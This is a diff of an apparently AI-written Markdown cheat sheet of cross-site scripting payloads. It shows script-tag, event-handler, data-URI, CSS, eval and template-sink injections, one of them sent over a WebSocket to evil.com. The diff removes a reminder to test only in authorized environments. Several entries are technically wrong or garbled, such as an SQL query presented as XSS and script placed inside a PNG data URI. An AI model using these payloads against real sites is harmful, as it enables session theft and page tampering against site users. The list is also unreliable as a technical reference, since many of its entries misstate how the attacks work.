@@ -353,51 +353,40 @@ SOAP Payload:
 Using HTML5 Features
 
 WebSockets:
-```html5
+```html
 new WebSocket('ws://evil.com?payload=<script>alert("XSS")</script>');
 ```
 Web Workers:
-```html5
+```html
 const worker = new Worker('data:text/javascript,alert("XSS")');
 
 ```
-Key Points to Remember
 
-Always test in safe, authorized environments.
-
-Each technique may require different contexts for execution.
-
-Be aware of Content Security Policy (CSP) restrictions that may affect payload execution.
-
-Understanding the application structure is key to finding viable injection points.
-
-
-Continue to refine your understanding of XSS vectors and stay updated on the latest techniques!
 
 Here’s a further expansion on advanced XSS techniques and payloads:
 
 Advanced XSS Techniques (Continued)
 
-14. Exploiting the document Object
+Exploiting the document Object
 
 Using document.write with Dynamic Content:
-```
+```html
 <script>var userInput = "<script>alert('XSS')</script>"; document.write(userInput);</script>
 ```
 Manipulating document.createElement:
-```
+```javascript
 var script = document.createElement('script');
 script.text = "alert('XSS')";
 document.body.appendChild(script);
 ```
 
-15. Cross-Domain Techniques
+Cross-Domain Techniques
 
 Using window.opener:
 
 In a pop-up, access the parent window.
 
-```
+```javascript
 window.opener.alert('XSS');
 ```
 Exploiting CORS Misconfigurations:
@@ -406,101 +395,104 @@ Sending malicious requests from an untrusted domain.
 
 
 
-16. Exploiting Web APIs
+Exploiting Web APIs
 
 Fetch API with Malicious Input:
-```
+```javascript
 fetch('http://example.com/api?param=<script>alert("XSS")</script>');
 ```
 Using WebSockets:
-```
+```html
 var ws = new WebSocket('ws://example.com/socket');
 ws.onmessage = function(event) { eval(event.data); };
 ```
 
-17. Template Injection
+Template Injection
 
 Exploiting Templating Engines:
 
 If the application uses a templating engine that evaluates unescaped input:
-```
 
+```html
 {{ "<script>alert('XSS')</script>" }}
 ```
 
-18. Exploiting Dynamic Rendering
+Exploiting Dynamic Rendering
 
 Using JavaScript Variables:
-```
+```javascript
 var userInput = "<script>alert('XSS')</script>";
 eval(userInput);
 ```
 
-19. Local Storage and Session Storage
+Local Storage and Session Storage
 
 Storing Malicious Payload:
-```
+
+```javaacript
 localStorage.setItem('key', "<script>alert('XSS')</script>");
 ```
+
 Retrieving and Executing:
-```
+
+```javascript
 var payload = localStorage.getItem('key');
 eval(payload);
 ```
 
-20. CSS Tricks
+CSS Tricks
 
 Using CSS @import:
-```
+
+```css
 @import 'data:text/css,body{background:url("javascript:alert(1)")}';
 ```
 Keyframe Animations:
-```
+
+```css
 @keyframes x { 0% { background: url("javascript:alert('XSS')") } }
 ```
 
 Context-Specific Payloads
 
-21. HTML Comments
+HTML Comments
 
 Using Comments to Bypass Filters:
-```
+```html
 <script><!--alert('XSS')--></script>
 ```
 
-22. Exploiting srcdoc Attribute in iframe
+Exploiting srcdoc Attribute in iframe
 
 Injecting Scripts via srcdoc:
-```
+```html
 <iframe srcdoc="<script>alert('XSS')</script>"></iframe>
 ```
 
-23. Audio and Video Tags
+Audio and Video Tags
 
 Using onerror in Media Elements:
-```
+```html
 <audio src="invalid.mp3" onerror="alert('XSS')"></audio>
 ```
 
-24. Flash and Other Plugins
+Flash and Other Plugins
 
 Flash Payloads:
-```
+```html
 <object data="data:application/x-shockwave-flash,<script>alert('XSS')</script>"></object>
 ```
 
-25. QR Codes and Links
+QR Codes and Links
 
 Generating QR Codes with Payloads:
 
 Encode URLs leading to malicious scripts.
 
-
-
-26. WordPress and CMS Exploits
+WordPress and CMS Exploits
 
 Using Shortcodes:
-```
+```html
 [xss]<script>alert('XSS')</script>[/xss]
 ```
 Theme and Plugin Vulnerabilities:
@@ -508,104 +500,97 @@ Theme and Plugin Vulnerabilities:
 Injecting payloads into fields that do not sanitize input.
 
 
-
-27. Advanced Browser Features
+Advanced Browser Features
 
 Service Workers:
 
 Registering a service worker that intercepts requests and injects scripts.
 
-
-
-28. Data URIs
+Data URIs
 
 Using Data URIs for XSS:
-```
+```html
 <img src="data:image/png;base64,iVBORw0KGg...<script>alert('XSS')</script>">
 ```
 
-29. Exploiting Framework Limitations
+Exploiting Framework Limitations
 
 Vue.js (v-html):
-```
+```vue.js
 <div v-html="userInput"></div>
 ```
 Angular (ng-bind):
-```
+```ng.js
 <div ng-bind="userInput"></div>
 ```
 
-30. Using Unvalidated Input
+Using Unvalidated Input
 
 Reflected XSS through URL Parameters:
 
 Accessing user input directly from the query string without sanitization.
 
 
-
-31. Advanced HTTP Header Manipulation
+Advanced HTTP Header Manipulation
 
 Custom Headers with Malicious Payload:
-```
+```http
 X-Custom-Header: <script>alert('XSS')</script>
 
 ```
-32. Contextual JavaScript
+Contextual JavaScript
 
 Using JavaScript's Function Constructor:
-```
+```javascript
 var payload = "alert('XSS')";
 var func = new Function(payload);
 func();
 ```
 
-33. Using setTimeout and setInterval
+Using setTimeout and setInterval
 
 Delaying Execution:
-```
+```javascript
 setTimeout("alert('XSS')", 1000);
 setInterval("alert('XSS')", 1000);
 ```
 
-Continuously explore new XSS vectors, as web technologies evolve.
 
-Keep up with the latest vulnerabilities and patches in frameworks.
-
-
-34. Hexadecimal Payloads
+Hexadecimal Payloads
 
 Basic Hexadecimal Encoding:
-```
+```html
 <script>alert(String.fromCharCode(88, 83, 83))</script>
 ```
-Full Payload in Hex:
 
 <script>alert('XSS')</script> encoded in url:
-```
+
+```url
 %3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
 ```
 
 
-35. Various Languages and Frameworks
+Various Languages and Frameworks
 
 Java
 
 Using JSP:
-```
+
+```jsp
 <%= "<script>alert('XSS')</script>" %>
 ```
 
 ASP.NET MVC
 
 Razor View Injection:
-```
+```asp.net
 @Html.Raw("<script>alert('XSS')</script>")
 ```
 
 Django
 
 Template Injection:
-```
+```django.js
 
 {{ "<script>alert('XSS')</script>"|safe }}
 ```
@@ -613,168 +598,174 @@ Template Injection:
 Flask (Python)
 
 Flask Template Rendering:
-```
+```python
 return render_template_string('<script>alert("XSS")</script>')
 ```
 
 PHP (Using eval)
 
 Dynamic Code Execution:
-```
+
+```php
 eval('?> <script>alert("XSS")</script> <?php');
 ```
 
 Node.js (Template Strings)
 
 Dynamic Injection:
-```
+```node.js
 const userInput = "<script>alert('XSS')</script>";
 res.send(`<html><body>${userInput}</body></html>`);
 ```
 
-36. Using Unicode and Character Encoding
+Using Unicode and Character Encoding
 
 Unicode Characters:
-```
+```html
 <script>document.body.innerHTML += '\u003Cscript\u003Ealert(\u0027XSS\u0027)\u003C/script\u003E';</script>
 ```
-37. Exploiting Object Prototypes
+Exploiting Object Prototypes
 
 Modifying Prototypes:
-```
+```javascript
 Object.prototype.toString = function() { alert('XSS'); };
 ```
 
-38. Payloads in WebSocket Messages
+Payloads in WebSocket Messages
 
 Sending Malicious Payloads:
-```
+```javascript
 var ws = new WebSocket('ws://example.com');
 ws.onmessage = function(event) { eval(event.data); };
 ws.send("<script>alert('XSS')</script>");
 ```
 
-39. Advanced CSS Injection
+Advanced CSS Injection
 
 CSS Filters:
 
 filter: 
-```
+```css
 progid:DXImageTransform.Microsoft.AlphaImageLoader(src='javascript:alert("XSS")', sizingMethod='scale');
 ```
 
-40. Using Base64 Encoding
+Using Base64 Encoding
 
 Base64 Encoded Payload:
-```
+```javascript
 <script src="data:text/javascript;base64,YWxlcnQoJ1hTUycpOw=="></script>
 ```
 
-41. Function Overriding
+Function Overriding
 
 Overriding alert Function:
-```
+```javascript
 window.alert = function() { console.log('XSS'); };
 alert('XSS');
 ```
 
-42. Testing XSS in Local Storage
+Testing XSS in Local Storage
 
 Storing XSS in Local Storage:
-```
+```javascript
 localStorage.setItem('xss', "<script>alert('XSS')</script>");
 var xssPayload = localStorage.getItem('xss');
 eval(xssPayload);
 ```
 
-43. Exploiting Malicious Forms
+Exploiting Malicious Forms
 
 Form Submission with Payload:
-```
+```javascript
 <form action="http://example.com" method="post">
     <input type="text" name="data" value="<script>alert('XSS')</script>">
     <input type="submit">
 </form>
 ```
 
-44. Using XSS in SQL Injection
+Using XSS in SQL Injection
 
 Combining SQL and XSS:
-```
+```sql
 SELECT * FROM users WHERE name = '<script>alert("XSS")</script>';
 ```
 
-45. Leveraging HTML5 Features
+Leveraging HTML5 Features
 
 Using the sandbox Attribute:
-```
+```html
 <iframe src="javascript:alert('XSS');" sandbox="allow-same-origin"></iframe>
 ```
 
-46. Event Listeners
+Event Listeners
 
 Adding Event Listeners Dynamically:
-```
+```html
 document.addEventListener('click', function() {
     alert('XSS');
 });
 ```
 
-47. Using Custom JavaScript Functions
+Using Custom JavaScript Functions
 
 Custom Function for XSS:
-```
+```javascript
 function executeXSS() {
     alert('XSS');
 }
 executeXSS();
 ```
 
-48. Encapsulated Scripts
+Encapsulated Scripts
 
 Using Template Literals:
-```
+```javascript
 const xss = `<script>alert('XSS')</script>`;
 document.body.innerHTML += xss;
 ```
 
-49. Exploiting Insecure Deserialization
+Exploiting Insecure Deserialization
 
 Crafted Object Injection:
-```
+
+```javascript
 const payload = {
     __proto__: { alert: function() { alert('XSS'); } }
 };
 console.log(payload);
 ```
 
-50. Advanced Event Manipulation
+Advanced Event Manipulation
 
 Using onmessage:
-```
+
+```javascript
 window.onmessage = function(event) {
     eval(event.data);
 };
 ```
 
-51. Combining Multiple Techniques
+Combining Multiple Techniques
 
 Combining setTimeout and eval:
-```
+
+```javascript
 setTimeout("eval('<script>alert(1)</script>')", 1000);
 ```
 
-52. Using Fragments in URLs
+Using Fragments in URLs
 
 Fragment Identifier:
-```
+
+```url
 http://example.com/#<script>alert('XSS')</script>
 ```
 
-53. Exploiting Insecure Headers
+Exploiting Insecure Headers
 
 Custom HTTP Headers:
-```
+
+```url
 X-Custom-Header: <script>alert('XSS')</script>
 ```
 
@@ -788,7 +779,9 @@ Always practice ethical hacking and ensure you have permission to test the syste
 
 Feel free to ask for further exploration into specific areas or techniques!
 
+Continuously explore new XSS vectors, as web technologies evolve.
 
+Keep up with the latest vulnerabilities and patches in frameworks.
 
 
 
